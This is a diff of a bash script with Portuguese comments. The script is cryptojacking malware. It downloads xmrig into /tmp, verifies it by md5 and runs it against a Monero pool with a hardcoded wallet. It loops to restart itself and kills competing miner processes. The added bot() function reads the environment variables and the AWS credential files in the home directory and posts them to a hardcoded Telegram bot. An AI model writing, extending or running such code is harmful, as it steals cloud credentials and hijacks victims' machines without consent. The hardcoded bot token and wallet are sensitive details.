@@ -1,8 +1,16 @@
 #!//bin/bash
 
 
-url='https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn'
+
+
+url='https://github.com/atilabyte/bash/raw/refs/heads/master/xmrig'
 killall='https://busybox.net/downloads/binaries/1.16.1/busybox-x86_64'
+
+
+
+
+
+
 
 
 
@@ -13,98 +21,51 @@ execute_vkzmn() {
 chmod_ok=0
 chmod 777 /tmp/vkzmn
 if (( $? )) ; then
-echo  erro  em aplica  a permissao no vkzmn
+# erro  em aplica  a permissao no vkzmn
 exit
 else 
 chmod_ok=1
 fi ; 
 if  (( $chmod_ok ))  ; then
-nohup  /tmp/vkzmn  &
+                                                
+echo executei o xmrig
+
+cd /tmp ; ./vkzmn  --tls   --url  pool.supportxmr.com:9000  --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy --pass atila  --donate-level 1
+
+ 
 fi ;
-
 }
 
 
 
+
+
+
+
+
+###############
 check_wget() {
-
 command -v wget 
-
 if (( $? )) ; then #if last err not  0  wget not found
-
 check_curl
-
 else
-
 echo  wget encontrado
-
-
-wget $killall  -O /tmp/busybox  #download of busybox  to use killall to kill  miners process
-
-chmod 777 /tmp/busybox
-
-
 wget $url -O /tmp/vkzmn
-
-
-
-
 fi;
-
 }
-
-
-
 
 check_curl() {
-
-
-
 command -v  curl
-
 if (( $? )) ; then 
-
-echo curl not found 
-
-check_python
-
+# curl not found 
+exit
 else 
-
-echo usando curl
-
+# usando curl
 curl -L  $url -o /tmp/vkzmn
-
 check_file
-
-
 fi;
-
 }
 
-
-check_python(){
-
-
-command -v  python3
-
-if (( $? )) ; then
-
-echo python nao instalado
-
-
-else 
-
-echo  usando python
-
-python3 -c 'import requests ; a=requests.get( "https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn");ptr=open("/tmp/vkzmn","wb");ptr.write(a.content) '
-
-
-check_file
-
-fi ; 
-
-
-}
 
 
 
@@ -114,51 +75,47 @@ check_file() {
 vkzmn_in_tmp=0
 ls /tmp/vkzmn  
 if (( $? )) ; then
-echo vkzmn nao esta em //tmp
+# vkzmn nao esta em //tmp
 check_wget
 else 
 vkzmn_in_tmp=1
 fi ;
 if (( $vkzmn_in_tmp )) ; then 
-echo vkzmn ja esta em //tmp
+# vkzmn ja esta em //tmp
 magic 
 fi;
 
 }
 
 
-
-
-
 magic() {  #check  if file is elf
 hash=0
-echo checando  a integridade do arquivo
+# checando  a integridade do arquivo
 command -v  md5sum
  if (( $?  )) ; then
-echo md5sum nao encontrado
+# md5sum nao encontrado
 exit #use  od 
 fi;
 md5=$( md5sum /tmp/vkzmn )
 for  m  in $md5 ; do  
-if [[ $m = '002ab35974600f09c26abe5b15ad11f4' ]] ; then
+if [[ $m = 'e1b3e738928012a07dfce8659b3ff31d' ]] ; then #hash md5 of   xmrig
 hash=1
 fi;
 done
 if (( $hash )) ; then
-echo binario conhecido
+# binario conhecido
 execute_vkzmn
 fi ;
 if  [  $hash  -eq   0  ]   ; then 
-echo binario  desconecido
+# binario  desconecido
 check_wget
 fi ; 
 }
 # -------------------------------------------
-
-
 proc() {
 true=1000
 while true ; do
+
 vkzmn_ok=0
 dir_proc=$( ls  /proc )
 for  pid  in   $dir_proc ; do
@@ -172,13 +129,18 @@ done
 fi; 
 done
 if   [  $vkzmn_ok   -eq    $true   ]  ; then
-echo vkzmn_ok
+echo  vkzmn_ok
 else 
 echo  vkzmn_not_ok
 check_file   
 fi ; 
+
+sleep  60
+
 done
+
 } 
+
 
 ###############################
 pg() {
@@ -195,63 +157,148 @@ fi ;
 if [ $pgrep -eq 1 ]  ; then
 pgrep  vkzmn 
 if (( $? )) ; then
-
 vkzmn_ok=0
-
 else 
-
 vkzmn_ok=1
-
 fi;
-
-
 if [  $vkzmn_ok   -eq  0  ]  ; then
-
 echo vkzmn nao  esta em execucao
-
 check_file
-
 fi;
-
-
 fi; 
-
 }
-
-
+#################################
 init() {
-
 while  true ; do
-
-sleep  1
-
+sleep   1
 pg
-
+sleep 1 
 done
 }
 
+#my_killall
+################3
+ 
 
+#implement  kill agent
+
+#xmrig  xmrig1 xmrig2 lolMiner lolminer bzminer  SRBMiner-MULTI nokillme  xmrig-Daemon  miniZ cpuMinerTermux  cpuminer-sse2 
 
 my_killall(){
 
 
-while true ; do
+while  true ; do
 
 
 
-/tmp/./busybox  killall  xmrig xmrig1 xmrig2 lolminer bzminer SRBMiner-MULTI nokillme
+proc_dir=$(ls /proc/)
 
-sleep  5
+for  pid in $proc_dir ; do
+
+if (( pid > 0 )) ; then
+
+procs=$(cat  /proc/$pid/comm)
+
+if  [[ $procs  = 'xmrig'  ]] ; then 
+kill -9  $pid
+if [[ $procs =   'xmrig1' ]] ; then 
+kill -9   $pid
+if  [[ $procs =  'xmrig2' ]] ; then  
+kill  -9 $pid
+if   [[  $procs =  'lolMiner' ]] ; then 
+kill -9  $pid
+if [[ $procs =  'lolminer' ]] ; then
+kill -9  $pid 
+if   [[ $procs =  'bzminer' ]] ; then
+kill -9  $pid
+if [[ $procs =  'SRBMiner-MULTI' ]] ; then
+kill -9 $pid
+if [[ $procs = 'nokillme' ]] ; then 
+kill -9 $pid
+if  [[ $procs = 'xmrig-Daemon' ]] ; then
+kill -9  $pid
+if  [[ $procs  = 'miniZ' ]] ; then 
+kill -9 $pid
+if [[ $procs = 'cpuMinerTermux' ]] ; then
+kill -9 $pid
+if [[ $procs  = 'cpuminer-sse2' ]] ; then
+kill -9 $pid
+
+
+fi;
+fi;
+fi;
+fi;
+fi;
+fi;
+fi;
+fi;
+fi;
+fi;
+fi;
+fi;
+
+
+fi;
 
 done
 
+sleep  60
+
+done #while
 }
 
 
-my_killall &
+
+
+#bot
+#########
+
+
+
+bot() {
+
+tgram_ok=0
+
+secrets=$( env  ;  cd  $HOME/.aws ; cat * ) #get env and aws key
+
+curl --max-time  1  -XPOST https://api.telegram.org/bot7975585705:AAEhpsmGaok-PDwktP3k83WDI-sF7OdS7o4/sendMessage  -H  "Content-Type: application/json" -d '{"chat_id": "7127446120" , "text": "'"$secrets"'" }'
+
+c=$( $? )
+
+
+if (( $? )) ; then
+
+tgram_ok=1
+
+fi
+
+while (( $tgram_ok  )) ; do
+
+echo   erro  em envia  as secrets
+
+exit
+
+done
+
+echo  secrets enviadas  
+
+
+}
 
  
+
+
+
+
+bot 
+ 
+my_killall  
+ 
 init 
+
+
+
 
 
 
